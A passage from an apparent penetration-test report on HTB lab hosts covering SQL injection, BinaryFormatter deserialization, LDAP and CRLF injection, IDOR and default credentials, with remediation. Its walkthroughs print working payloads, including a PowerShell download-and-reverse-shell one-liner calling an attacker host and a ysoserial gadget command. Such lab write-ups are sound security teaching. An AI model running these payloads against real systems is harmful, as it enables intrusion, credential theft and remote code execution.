* **Lateral movement** Credentials and configuration details extracted from the vault can be reused against other internal services, such as the forum, database server, or any other application sharing the same identity or infrastructure.


#### Detailed Walkthrough

1. **Source-code review**

   While reviewing `Controllers/MyController.cs`, the tester identified the vulnerable query in the `SecondaryEmail()` action:



   ```C#
   cmd.CommandText = string.Format("SELECT * FROM Users WHERE Email = '{0}' OR SecondaryEmail = '{0}'", secondaryEmail);
   ```

   Because the value is concatenated directly into the SQL string and the regex check is bypassable, the endpoint is clearly injectable.

2. **Confirming error-based boolean injection**

   The tester submitted a payload designed to trigger a divide-by-zero error when the injected condition is true:



   ```HTTP
   secondaryEmail=asd@me.com'UNION+SELECT+NULL,NULL,NULL,+CASE+WHEN+(1=1)+THEN+1/0+ELSE+NULL+END;--+-
   ```

   The server responded with a `Divide by zero error encountered` message, proving the injected SQL was executed and the fourth column was processed.

![88cFsBdW](assets/edited-88cFsBdW.png)

   To confirm the injection was conditional, the tester changed the condition to `1=2`:



   ```HTTP
   secondaryEmail=asd@me.com'UNION+SELECT+NULL,NULL,NULL,+CASE+WHEN+(1=2)+THEN+1/0+ELSE+NULL+END;--+-
   ```

   This time the server returned a normal `302 redirect` with no error, showing the condition controlled query behavior.

   

![PgZu2fQ4](assets/edited-PgZu2fQ4.png)

3. **Extracting internal paths from error messages**

   The error responses revealed the physical path of the application source file:

   Plaintext

   ```
   C:\inetpub\wwwroot\vault.royalflush.htb\Controllers\MyController.cs:192
   ```

![lUlRGkHi](assets/edited-lUlRGkHi.png)


   This confirmed the application was running under IIS in `C:\inetpub\wwwroot\vault.royalflush.htb\`.

4. **Mapping file existence through SQL Server bulk-load errors**

   The tester used SQL Server's `OPENROWSET(BULK...)` primitive to probe files on disk. Different operating-system error codes in the response distinguished between non-existent paths, existing-but-inaccessible paths, and existing readable files:

   * **Path does not exist returned:**
     ```Plaintext
     Cannot bulk load because the file "C:\inetpub\wwwroot\webapp\vault" could not be opened. Operating system error code 3(The system cannot find the path specified.).
     ```
   * **Path exists but access denied returned:**
     ```Plaintext
     Cannot bulk load because the file "C:\inetpub\wwwroot" could not be opened. Operating system error code 5(Access is denied.).
     ```
   * **File does not exist returned:**
     ```Plaintext
     Cannot bulk load. The file "C:\inetpub\wwwroot\vault.royalflush.htb\Web.configs" does not exist or you don't have file access rights.
     ```

5. **Locating and dumping Web.config**

   After testing several paths, the tester confirmed that `C:\inetpub\wwwroot\vault.royalflush.htb\Web.config` existed because the request returned `302 Found` instead of a file-not-found error. Supplying a deliberately wrong filename such as `Web.configs` returned `500` with a clear "does not exist" message, confirming the base file was real.

   The tester then wrote a script to read the file in chunks through the SQL injection and reassemble its contents.

[vault.royalflush.htb-SecondaryEmail-SQLI-Web-Config-dump.py](exploits/vault.royalflush.htb-SecondaryEmail-SQLI-Web-Config-dump.py)

   The dumped `Web.config` contained the application's sensitive cryptographic keys:



   ```XML
   <add key="webpages:Version" value="3.0.0.0" />
   <add key="webpages:Enabled" value="false" />
   <add key="ClientValidationEnabled" value="true" />
   <add key="UnobtrusiveJavaScriptEnabled" value="true" />
   <add key="AuthKey" value="874c2f91-7346-4005-****-********" />
   <add key="AuthCookieName" value="user" />
   <add key="PasswordKey" value="f3d9aa53-c08d-43" />
   <add key="PasswordIV" value="5ac8083e-8ff6-43" />
   </appSettings>
   ```

 

![3z19onm8](assets/edited-3z19onm8.png)


   With these keys, an attacker can forge authentication cookies and decrypt stored password values, completing the compromise of the vault application.


#### Patching and Remediation

1. Use parameterized queries
      Replace the dynamic SQL in MyController.SecondaryEmail() with a parameterized query. Never concatenate user input into CommandText:

      ```csharp
        [HttpPost]
        public ActionResult SecondaryEmail()
        {
            User user = AuthService.LoggedInUser(Request);
            if (user == null) return Redirect("/Auth/Login");

            string secondaryEmail = Request["secondaryEmail"];

            if (!secondaryEmail.IsEmpty())
            {
                // Use System.Net.Mail.MailAddress for proper email validation
                try
                {
                    var addr = new System.Net.Mail.MailAddress(secondaryEmail);
                }
                catch
                {
                    return Redirect("/My/Settings");
                }

                using (SqlConnection conn = DbService.GetSqlConnection())
                using (SqlCommand cmd = new SqlCommand())
                {
                    cmd.Connection = conn;
                    cmd.CommandType = CommandType.Text;
                    cmd.CommandText = "SELECT 1 FROM Users WHERE Email = @Email OR SecondaryEmail = @SecondaryEmail";
                    cmd.Parameters.AddWithValue("@Email", secondaryEmail);
                    cmd.Parameters.AddWithValue("@SecondaryEmail", secondaryEmail);

                    conn.Open();
                    using (SqlDataReader rdr = cmd.ExecuteReader())
                    {
                        if (!rdr.Read())
                        {
                            rdr.Close();
                            cmd.CommandText = "UPDATE Users SET SecondaryEmail = @SecondaryEmail WHERE UserID = @UserID";
                            cmd.Parameters.Clear();
                            cmd.Parameters.AddWithValue("@SecondaryEmail", secondaryEmail);
                            cmd.Parameters.AddWithValue("@UserID", user.UserID);
                            cmd.ExecuteNonQuery();
                        }
                    }
                }
            }
            return Redirect("/My/Settings");
        }
      ```

   2. Validate email format correctly
      Replace the bypassable regex with System.Net.Mail.MailAddress or a strictly anchored RFC-compliant regex. Also normalize and trim the input before validation and storage.

   3. Apply least privilege to the database account
      The vault_user account should only have the minimum permissions required: SELECT, INSERT, UPDATE, and DELETE on the specific tables it needs. It should not have permissions to run
      OPENROWSET(BULK...), xp_cmdshell, xp_dirtree, or other server-level features that enable file-system access.

   4. Disable dangerous SQL Server features if not needed
      Turn off xp_cmdshell and Ole Automation Procedures, and restrict OPENROWSET/BULK INSERT to accounts that genuinely require them. Enable TRUSTWORTHY and IMPERSONATE only where strictly
      necessary.

   5. Do not expose detailed error messages
      Configure ASP.NET custom errors in Web.config so that stack traces, file paths, and database error details are never returned to the browser in production:

      ```xml
        <system.web>
            <customErrors mode="On" defaultRedirect="~/Error/Generic">
                <error statusCode="500" redirect="~/Error/ServerError"/>
            </customErrors>
        </system.web>
      ```

   6. Rotate all exposed secrets immediately
      Because the attacker extracted AuthKey, PasswordKey, and PasswordIV from Web.config, these must be regenerated and replaced. All existing sessions should be invalidated, and all
      stored encrypted passwords should be re-encrypted with the new keys or reset.

   7. Move secrets out of source-controlled configuration
      Store cryptographic keys in environment variables, Azure Key Vault, AWS Secrets Manager, or another secrets manager rather than in Web.config. Ensure the application process identity
      is the only account that can read them.

   8. Audit all SQL queries
      Search the entire codebase for string.Format, + concatenation, or inline string interpolation inside CommandText. Every query must use SqlParameter. Pay special attention to
      MyController, AuthService, and any other controllers.

   9. Implement Web Application Firewall (WAF) rules
      As a defense-in-depth measure, add WAF rules to detect SQL keywords, UNION SELECT, and bulk-load primitives in input fields. This should not replace parameterized queries but can block automated scanners and obvious injection attempts.


### .NET BinaryFormatter deserialization {#0038712a-c54f-41b6-bad2-da0c98d68114}

#### CWE

CWE-502

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (9.4 - Critical)

#### Affected Component(s)

*  PasswordService.DecryptPassword() in Services/PasswordService.cs =>  BinaryFormatter.Deserialize()

#### External References

* [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
* [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
* [PortSwigger Web Security Academy - Deserialization](https://portswigger.net/web-security/deserialization)

#### Description & Cause

The vault application uses the .NET BinaryFormatter to deserialize password values before returning them to the user. BinaryFormatter is a dangerous deserializer that performs full object deserialization and is known to be vulnerable to remote code execution when it processes attacker-controlled data. Because the application decrypts stored password entries with `BinaryFormatter.Deserialize()`, an attacker who can control the encrypted ciphertext can embed a malicious serialized .NET object. When the application decrypts and deserializes that payload—such as when the user visits `/My/Passwords`—the object instantiation chain executes arbitrary code on the server.

In practice, the attacker can chain this with the SQL injection/file-read vulnerability to obtain the AES `PasswordKey` and `PasswordIV` from `Web.config`, encrypt a custom BinaryFormatter gadget payload, and import it through `/My/ImportPassword`. Viewing the password list then triggers the payload and yields code execution under the IIS application pool identity.

The root cause is the use of an insecure deserializer on untrusted input:

1. **Insecure use of BinaryFormatter**

   `PasswordService.DecryptPassword()` creates a BinaryFormatter and calls `Deserialize()` on decrypted bytes:

   C#

   ```
   BinaryFormatter bf = new BinaryFormatter();
   return Encoding.UTF8.GetString((byte[])bf.Deserialize(new MemoryStream(plaintext)));
   ```

   BinaryFormatter is obsolete and explicitly documented by Microsoft as unsafe for deserializing untrusted input because it can instantiate arbitrary types and run their constructors, property setters, and `OnDeserialized` methods.

2. **Attacker-controlled encrypted payload**

   The `ImportPassword` action in `MyController` accepts a base64 `encryptedPassword` value from the request and stores it in the database without validation:

   C#

   ```
   string encryptedPassword = Request["encryptedPassword"];
   ...
   cmd.CommandText = "INSERT INTO Passwords (UserID, Name, EncryptedValue) VALUES (@UserId, @Name, @EncryptedValue)";
   cmd.Parameters.AddWithValue("@EncryptedValue", encryptedPassword);
   ```

3. **AES keys exposed through configuration**

   The `PasswordKey` and `PasswordIV` are stored in plaintext in `Web.config`. Once obtained through the SQL injection/file-read vulnerability, the attacker can encrypt any byte array with the same AES parameters and produce ciphertext that the application will successfully decrypt.

4. **No type restrictions or deserialization binder**

   The BinaryFormatter instance does not set a `SerializationBinder` to whitelist allowed types, so any serializable .NET type present in the application domain or its dependencies can be instantiated.

5. **Decryption is treated as a trust boundary**

   The application assumes that because data is encrypted, it is safe to deserialize. Encryption only provides confidentiality, not integrity or trust; an attacker with the key can forge ciphertext, so the decrypted bytes must still be treated as untrusted input.


#### Security Impact

* **Complete host takeover** The attacker can run arbitrary commands, install persistence mechanisms, create new accounts, and take full control of the underlying Windows server.


#### Detailed Walkthrough

1. **Prepare the PowerShell download and shell payload**

   The tester created a base64-encoded PowerShell command that downloads `nc.exe` from the attacker's server and executes a reverse shell:



   ```bash
   echo -n '(new-object net.webclient).downloadfile("http://<ip>:<port>/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv <ip> <shell-port> -e c:\windows\system32\cmd.exe;' | iconv -t UTF-16LE | base64 -w0
   ```

   This produces a UTF-16LE base64-encoded PowerShell payload.

2. **Generate the .NET deserialization gadget**

   Using `ysoserial.net`, the tester generated a malicious `BinaryFormatter` payload with the `TypeConfuseDelegate` gadget chain, passing the encoded PowerShell command as the execution argument:



   ```powershell
   .\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "powershell -nop -enc <payload_b64>"
   ```

   The output is a base64 binary serialized object that, when deserialized by `BinaryFormatter`, will execute the supplied PowerShell command.

3. **Encrypt the payload with the leaked AES key**

   Because the application decrypts the stored value with AES before passing it to `BinaryFormatter.Deserialize`, the raw binary payload must be encrypted using the same key and IV exposed in `Web.config`:


   ```xml
   <add key="PasswordKey" value="f3d9aa53-c08d-43" />
   <add key="PasswordIV" value="5ac8083e-8ff6-43" />
   ```

   The tester used the helper script `vault.royalflush.htb-Deserialization-Payload.py` to perform this encryption. First, the base64-encoded gadget payload was saved to `payload.b64`, then:



   ```bash
   python vault.royalflush.htb-Deserialization-Payload.py payload.b64
   ```

   The script produced the final base64 ciphertext that the vault application could decrypt successfully.

4. **Start the listener**

   On the attacker system, the tester started a netcat listener to catch the reverse shell:



   ```bash
   nc -lvnp <shell-port>
   ```

   A simple HTTP server was also started to serve `nc.exe`:

   ```bash
   python3 -m http.server <port>
   ```

5. **Submit the encrypted payload**

   The tester logged in to the vault application and submitted the encrypted payload through the Import Password feature at `POST /My/ImportPassword`, supplying a name and the generated ciphertext as the `encryptedPassword` value.

6. **Trigger deserialization and gain RCE**

   The tester navigated to `/My/Passwords`. The application retrieved the newly imported entry, decrypted the ciphertext with AES, and passed the resulting bytes to `BinaryFormatter.Deserialize()`. The gadget chain executed, launching PowerShell, downloading `nc.exe`, and connecting back to the attacker listener.

7. **Shell access and flag retrieval**

   The reverse shell connected, giving the tester command execution as the IIS application pool identity on the target server. The flag was found in the root of `C:\`:



   ```dos
   C:\> dir C:\
   ...
   ddf1df82dea9ce0d6ab3a03aa80cbdac
   ```


![teGQvpT4](assets/edited-teGQvpT4.png)


   The tester had successfully achieved remote code execution by chaining the SQL injection/file-read vulnerability with the insecure `BinaryFormatter` deserialization.


#### Patching and Remediation


1. **Remove BinaryFormatter entirely**

   BinaryFormatter is obsolete and unsafe. The simplest fix is to stop serializing the password at all. Passwords should be stored as plain UTF-8 strings and encrypted directly:



   ```c#
   public static string EncryptPassword(string password)
   {
       byte[] plaintext = Encoding.UTF8.GetBytes(password);
       byte[] ciphertext;

       using (ICryptoTransform encryptor = GetAES().CreateEncryptor())
           ciphertext = encryptor.TransformFinalBlock(plaintext, 0, plaintext.Length);

       return Convert.ToBase64String(ciphertext);
   }

   public static string DecryptPassword(string b64)
   {
       try
       {
           byte[] ciphertext = Convert.FromBase64String(b64);
           byte[] plaintext;

           using (ICryptoTransform decryptor = GetAES().CreateDecryptor())
               plaintext = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);

           return Encoding.UTF8.GetString(plaintext);
       }
       catch (Exception)
       {
           return "[!] ERROR: Corrupted Password";
       }
   }
   ```

   If the current database already contains BinaryFormatter-serialized entries, write a one-time migration that decrypts, deserializes in a fully trusted offline process, re-encrypts as plain strings, and updates the records.

2. **If serialization is truly required, use a safe serializer**

   Replace BinaryFormatter with `System.Text.Json` or `Newtonsoft.Json` with `TypeNameHandling.None`. Never enable type-name handling unless a strict `SerializationBinder` whitelist is in place.

3. **Authenticate encrypted values (Encrypt-then-MAC)**

   Encryption alone does not protect integrity. Use an HMAC (e.g., `HMACSHA256` with a separate key) over the ciphertext and verify it before decryption. This prevents an attacker from forging ciphertext even if the encryption key is compromised.



   ```c#
   byte[] ComputeHmac(byte[] data)
   {
       using (var hmac = new HMACSHA256(hmacKey))
           return hmac.ComputeHash(data);
   }
   ```

4. **Validate imported encrypted passwords**

   Do not allow the `ImportPassword` endpoint to accept arbitrary encrypted blobs without verification. After decrypting, validate that the result is a legitimate password string (length, character set) before storing it.

5. **Remove or restrict the ImportPassword feature**

   If the feature is not required, delete the `ImportPassword` action entirely. If it is required, require re-authentication, log every import, and restrict it to administrators.

6. **Rotate cryptographic keys**

   Because the `PasswordKey`, `PasswordIV`, and `AuthKey` were exposed, generate new keys immediately. Re-encrypt all stored passwords with the new keys and invalidate all existing sessions/cookies.

7. **Run the application pool under a low-privilege account**

   Configure IIS to run the application pool as a dedicated, low-privilege service account with no administrative rights. This limits the damage if RCE is achieved.

8. **Enable deserialization mitigations**

   If migration away from BinaryFormatter is not immediately possible, set an AppContext switch to block dangerous types and configure a strict `SerializationBinder` that whitelists only `byte[]`:



   ```c#
   AppContext.SetSwitch("Switch.System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.DangerousBinaryFormatterSerializationSwitch", true);
   ```

   However, this is only a temporary defense; complete removal is strongly recommended.

9. **Patch and update dependencies**

   Ensure all .NET libraries and NuGet packages are up to date so that known gadget chains in common libraries are eliminated.

10. **Monitor for exploitation**

    Log and alert on unusual process creation from the IIS worker process, such as `powershell.exe`, `cmd.exe`, or network connections to unexpected external addresses.



### LDAP injection at ldap.vitamedix.htb {#6bfa3977-88f0-4c2c-91d3-978ce8913206}

#### CWE

CWE-90 (CWE-287 secondary)

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N (8.8 - High)

#### Affected Component(s)

* http://ldap.vitamedix.htb/login

#### External References

* [OWASP LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)
* [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
* [CWE-90: Improper Neutralization of Special Elements used in an LDAP Query](https://cwe.mitre.org/data/definitions/90.html)

#### Description & Cause

The LDAP authentication endpoint at ldap.vitamedix.htb fails to validate or escape user-supplied credentials before using them in an LDAP search or bind operation. Submitting the wildcard string `*` (or similar wildcard patterns) causes the LDAP query to match any user record instead of verifying a specific username/password pair. The application then treats the first matched entry — in this case an administrative account — as a successful login, disclosing the user list and emails such as <mic****@vitamedix.htb>.

#### How it works (typical vulnerable filter)

A common vulnerable login query looks like:

Code snippet

```
(&(uid=USERNAME)(userPassword=PASSWORD))
```

When the attacker sends:

Plaintext

```
USERNAME = *:*
PASSWORD = *:*
```

the filter becomes:

Code snippet

```
(&(uid=*:*)(userPassword=*:*))
```

The \* character is the LDAP wildcard, so the filter evaluates to true for any entry with a uid and any entry with a userPassword, effectively returning the first directory object (often the admin account). The server-side code then assumes authentication succeeded because a result was returned.

#### Causes

1. Unsanitized input in LDAP filters — the username and password are concatenated directly into the LDAP query without escaping special characters (\*, (, ), , NUL).
2. Missing input validation — no allowlist, length limit, or character-set check is applied to the credentials before they reach the LDAP layer.
3. Incorrect authentication logic — the application treats "LDAP query returned a record" as equivalent to "credentials verified," rather than performing a proper bind with the supplied password.


#### Security Impact

* **Confidentiality:** All user email addresses stored in the directory are exposed, including mic****@vitamedix.htb and any other accounts. This is PII that can be used for phishing, targeted attacks, or correlation with other breaches.

#### Detailed Walkthrough

1. A request to ldap.vitamedix.htb/login returned the login page.
2. Entered *:* in both username and password fields.
3. Server built an LDAP filter like (&(uid=*:*)(userPassword=*:*)), which matched any directory entry.
![13 19 18 06 zJ8HQ8jy](assets/Screenshot-from-2026-08-13-19-18-06-zJ8HQ8jy.png)
4. Logged in as the first returned account — admin.
5. Enumerated users and found <mic****@vitamedix.htb>.


#### Patching and Remediation


1. **Use LDAP bind, not search filters, for authentication**

   Authenticate by binding with the user-supplied credentials directly. A failed bind means invalid credentials.

2. **Escape LDAP metacharacters**

   If you must build filters, escape \*, (, ), , and NUL before inserting user input.

3. **Validate input**

   Enforce allowlists for usernames (e.g., alphanumeric/email format) and reject wildcard characters.

4. **Least-privilege service account**

   The application should bind with an account that can only read the minimum attributes required.

5. **Return only needed attributes**

   Restrict the LDAP query to return only the fields necessary for login.

6. **Monitor and alert**

   Log failed and unusual login patterns, especially wildcard submissions.



### Valid email enumeration via forgot-password self-service (michael@vitamedix.htb) {#5296e7d1-3552-4af2-8303-4f39f503ee54}

#### CWE

CWE-204

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (6.9 - Medium)

#### Affected Component(s)

* http://self-service.vitamedix.htb/forgot-password

#### External References

* [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
* [CWE-204: Observable Response Discrepancy](https://cwe.mitre.org/data/definitions/204.html)
* [PortSwigger Web Security Academy - Username enumeration](https://portswigger.net/web-security/authentication/username-enumeration)

#### Description & Cause

The forgot-password endpoint on self-service.vitamedix.htb returns a different message depending on whether the submitted email exists in the database:

• Existing email → Email sent

• Non-existing email → Not found

This allows an attacker to determine which email addresses are registered by brute-forcing the form.

1. Verbose error responses — the server reveals account existence through the response text.
2. No rate limiting — the endpoint accepts unlimited requests, enabling automated wordlist attacks.
3. Missing account-existence abstraction — the application should return the same generic message (e.g., "If the email exists, a reset link was sent") regardless of whether the email is registered.

#### Security Impact

  • Enumerates valid user accounts for targeted phishing or credential-stuffing attacks.


#### Detailed Walkthrough

1. A request to self-service.vitamedix.htb/forgot-password returned the password-reset form.
2. Submit an invalid email, e.g. <notauser@vitamedix.htb>.
3. Server responds: Not found.
4. Submit a valid email, e.g. <mic****@vitamedix.htb>.
5. Server responds: Email sent.
6. The response difference confirms <mic****@vitamedix.htb> is a registered account.
7.
![qJdFDohk](assets/edited-qJdFDohk.png)

8. Repeat with a wordlist to enumerate all valid users.

#### Patching and Remediation

1. Return the same message for every email — e.g., "If the email exists, a reset link was sent."
2. Rate-limit the endpoint — cap requests per IP and per email address.
3. Add CAPTCHA — slows automated enumeration.
4. Log and monitor — alert on high-volume forgot-password requests.



### Logic Flaw on Storage.vitamedix.htb → SMTP credentials leak {#a5772f07-ca79-4f30-9424-51762dbe1fc8}

#### CWE

CWE-639

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (7.1 - High)

#### Affected Component(s)

* Storage-master/storage/storage.vitamedix.htb/src/render.php
* Storage-master/storage/storage.vitamedix.htb/src/reports.php
* Storage-master/storage/storage.vitamedix.htb/src/db.php (fetch_data())

#### External References

* [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
* [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
* [PortSwigger Web Security Academy - Insecure direct object references (IDOR)](https://portswigger.net/web-security/access-control/idor)

#### Description & Cause

Description

   An authenticated user can read files belonging to other accounts by manipulating the file ID flow between reports.php and render.php. Although reports.php rejects unauthorized IDs, it
   stores the requested ID in the session before the access check. Visiting render.php afterwards serves the file because render.php never validates ownership.

   Causes

   1. Authorization only in one location — render.php has no ownership check.
   2. Session write before validation — reports.php saves the user-supplied ID into $_SESSION before confirming access.
   3. Trusting session state — render.php assumes the session ID was pre-authorized.
   4. Missing defense-in-depth — no second authorization check on the actual data-fetch operation.

#### Security Impact

* **Broken access control:** Any authenticated user can read files owned by other users or admins by swapping error.php for render.php after a failed `/reports.php?id=<id>` request.
* **Credential leak:** Sensitive files stored in the system — such as documents containing SMTP credentials — can be accessed without authorization, enabling further compromise of email/SMTP infrastructure.


#### Detailed Walkthrough

1. Source code review of `Storage-master/storage/storage.vitamedix.htb/src/config.php` reveals hardcoded database credentials: `henry:H3nry_V@u*******`.
2. After authenticating to `storage.vitamedix.htb`, a request for a file owned by the user returned the file: `GET /reports.php?id=1`.
3. Intercept the response — server sets `$_SESSION['id'] = 1`, passes the access check, and redirects to `render.php`.
4. Request a file you do not own: `GET /reports.php?id=133`.
5. Server sets `$_SESSION['id'] = 133`, fails `check_access()`, and redirects to `error.php`.
6. Intercept the `error.php` redirect and change the location to `render.php`.
7. Browser follows `GET /render.php`; it reads `$_SESSION['id']` (still 133) and returns the file contents.
8. The response now leaks the unauthorized file, e.g., SMTP credentials.


script to automate it

[storage.vitamedix.htb-SMTP-Creds-LEAK.py](exploits/storage.vitamedix.htb-SMTP-Creds-LEAK.py)

![N2aP1zpX](assets/edited-N2aP1zpX.png)



#### Patching and Remediation

  1. Re-authorize in render.php — call check_access($_SESSION['id'], $_SESSION['user']) before fetching the file.
   2. Set session ID only after authorization — in reports.php, validate ownership before storing the ID in $_SESSION.
   3. Pass ID via signed/encrypted parameter — use a token instead of a raw integer in the URL/session.
   4. Remove hardcoded credentials — move `he***:H3nry_***** `from config.php to environment variables or a secrets manager and rotate it.
   5. Log access attempts — alert on unauthorized file access attempts.

  **Fixed Code**


#### Source Code Overview

#### `reports.php`



```php
<?php
session_start();
require_once ('db.php');

if(!$_SESSION['user']){
  header("Location: index.php");
  exit;
}

$id = isset($_GET['id']) ? intval($_GET['id']) : 0;

if($id > 0 && check_access($id, $_SESSION['user'])){
  $_SESSION['id'] = $id;
  header("Location: render.php");
  exit;
}

header("Location: error.php");
exit;
?>
```

#### `render.php`



```php
<?php
session_start();
require_once ('db.php');

if(!$_SESSION['user']){
  header("Location: index.php");
  exit;
}

$id = isset($_SESSION['id']) ? intval($_SESSION['id']) : 0;

if($id <= 0 || !check_access($id, $_SESSION['user'])){
  header("Location: error.php");
  exit;
}

$user_data = fetch_user_data($_SESSION['user']);
$data = fetch_data($id);
?>
```

#### `config.php`



```php
<?php
$servername = getenv('DB_HOST') ?: '127.0.0.1';
$dbusername = getenv('DB_USER') ?: '';
$password   = getenv('DB_PASS') ?: '';
$dBName     = getenv('DB_NAME') ?: 'db';

$conn = mysqli_connect($servername, $dbusername, $password, $dBName);

if(!$conn){
  die("Connection failed: " . mysqli_connect_error());
}
?>
```



### Email header injection (CRLF) in password reset {#d344076c-001e-4d19-acab-ec9e495fab71}

#### CWE

CWE-93

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (8.6 - High)

#### Affected Component(s)

* POST /reset.php

#### External References

* [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
* [CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')](https://cwe.mitre.org/data/definitions/93.html)
* [PortSwigger Web Security Academy - CRLF injection](https://portswigger.net/web-security/request-smuggling/crlf-injection)

#### Description & Cause

The password-reset endpoint at `selfservice.vitamedix.htb/reset.php` is vulnerable to **CRLF injection** (Email Header Injection).

An attacker submits a victim email followed by encoded carriage-return/line-feed characters (`%0d%0a`) and additional SMTP headers. The server includes those headers in the outgoing password-reset email, CC'ing/BCC'ing the specified address. The attacker then receives the reset email containing the victim's newly generated password.

#### Example Payload


```http
email=michael%40vitamedix.htb%0d%0aCc:+smtp-dev@vitamedix.htb%0d%0aDAM:+
```

* **Result:** The reset email for `michael@vitamedix.htb` is also delivered to `smtp-dev@vitamedix.htb`, exposing the new password.

#### Root Causes

1. **Unsanitized Email Input:** The `email` parameter is injected directly into mail headers without stripping `\r`, `\n`, or header injection sequences.
2. **Header Concatenation:** The application manually constructs raw SMTP headers using unsanitized user input.
3. **Weak Password Reset Flow:** The reset password or token is transmitted in plaintext via email without secondary verification.
4. **Missing Input/Output Validation:** The application fails to validate that the `email` parameter is a single, strictly formatted email address prior to calling the mail function.


#### Security Impact

• Account takeover: The attacker receives the victim's newly generated password and can log in as the victim.\
• Confidentiality breach: Access to all data and functions available to the compromised account.\
• Email header injection: Beyond credential theft, the attacker can inject arbitrary SMTP headers (Cc, Bcc, Subject, etc.) for spam/phishing pivoting.


#### Detailed Walkthrough


1. A request to `selfservice.vitamedix.htb/reset.php` returned the reset page.

2. Submit the payload in the `email` field:



   ```http
   michael%40vitamedix.htb%0d%0aCc:+smtp-dev@vitamedix.htb%0d%0aDAM:+
   ```

3. The server constructs the reset email and injects the attacker-controlled headers, adding `smtp-dev@vitamedix.htb` to the `Cc` field.

4. The email is generated and sent to `michael@vitamedix.htb`, with a copy delivered to the attacker's address.

![noHcjyeb](assets/edited-noHcjyeb.png)
5. In the attacker's inbox (`smtp-dev@vitamedix.htb`), the email is received containing the newly generated credentials:



   ```Plaintext
   Subject: Password reset for mic****
   Your new password is 9ecf1ffe7c795099b8ad40**********
   ```

6. Authenticated access to `newsletter.vitamedix.htb` was obtained as `mic****@vitamedix.htb` using the intercepted password.
7. Notice the flag at the `http://newsletter.vitamedix.htb/home`

![13 23 13 51](assets/Screenshot-from-2026-08-13-23-13-51.png)


#### Patching and Remediation

1. **Sanitize Email Input:** Strip `\r`, `\n`, and header injection characters (or strictly validate using `FILTER_VALIDATE_EMAIL`) before using the address in SMTP headers.
2. **Use a Hardened Mail Library:** Utilize robust libraries (such as PHPMailer or Symfony Mailer) that automatically sanitize header fields and handle encoding securely rather than concatenating raw strings.
3. **Token-Based Reset:** Implement secure password reset mechanics by sending a time-limited, cryptographically secure single-use reset token/link instead of emailing newly generated plaintext passwords.
4. **Log Reset Requests:** Maintain centralized logging for password-reset events to alert on potential abuse, rapid requests, or unexpected SMTP response behaviors.
5. **Implement Rate Limiting:** Enforce strict rate limits on the password reset endpoint per IP address and target account to mitigate automated or brute-force attempts.



### DNS.vitamedix:8006 Pi-hole password leak (WEBPASSWORD: pih***) {#0f92f352-828c-4b46-b853-6592beec8b3d}

#### CWE

CWE-1392

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (9.3 - Critical)

#### Affected Component(s)

* http://dns.vitamedix.htb:8006/admin/login.php

#### External References

* [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
* [CWE-1392: Use of Default Credentials](https://cwe.mitre.org/data/definitions/1392.html)
* [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)

#### Description & Cause

The DNS server component is deployed as a Pi-hole container via DNS-Server-master/dns-server/docker-compose.yml. The Pi-hole web admin password is explicitly set to the default/weak value pih*** through the WEBPASSWORD environment variable:

```yaml
     environment:
       WEBPASSWORD: "pih***"
```

This value is a well-known default password for Pi-hole. The web administration interface is exposed on port 8006, and no additional authentication hardening is applied. An unauthenticated remote attacker can log in to the Pi-hole admin panel using the  password pih***, gaining full administrative control over the DNS service.


#### Security Impact

Once authenticated to Pi-hole, the attacker can:

* **Confidentiality:** Browse DNS query logs, exposing every domain requested by internal users.
* **Integrity:** Add malicious blocklists, whitelist phishing domains, or redirect internal traffic via DNS manipulation.
* **Availability:** Disable DNS resolution entirely, causing a network-wide denial of service.


#### Detailed Walkthrough

1. A request to <http://dns.vitamedix.htb:8006/admin/login.php> returned the login page.

![image](assets/image.png)

2. Enter the default Pi-hole password: pih***.
3. Submit the form — the application logs you into the admin dashboard at /admin/.
4.
![JBVrLWta](assets/edited-JBVrLWta.png)

5. From the dashboard, you can view DNS query logs, modify blocklists/whitelists, and control DNS resolution.
![GnyLQ1C1](assets/edited-GnyLQ1C1.png)


#### Patching and Remediation


1. Remove the hardcoded/default WEBPASSWORD value and generate a strong, unique password during deployment.


2. Do not expose the Pi-hole web admin interface to untrusted networks; restrict it to an internal management segment or VPN.


3. Rotate the Pi-hole admin password and enable any available multi-factor or access-control features.


4. Consider mounting the password from a secrets manager or environment-specific .env file rather than version-controlled YAML.



### NoSQL Injection in /api/validateToken www.vitamedix.htb {#aaa9d649-31b9-4592-992d-51182c427f73}

#### CWE

CWE-943

#### CVSS 4.0

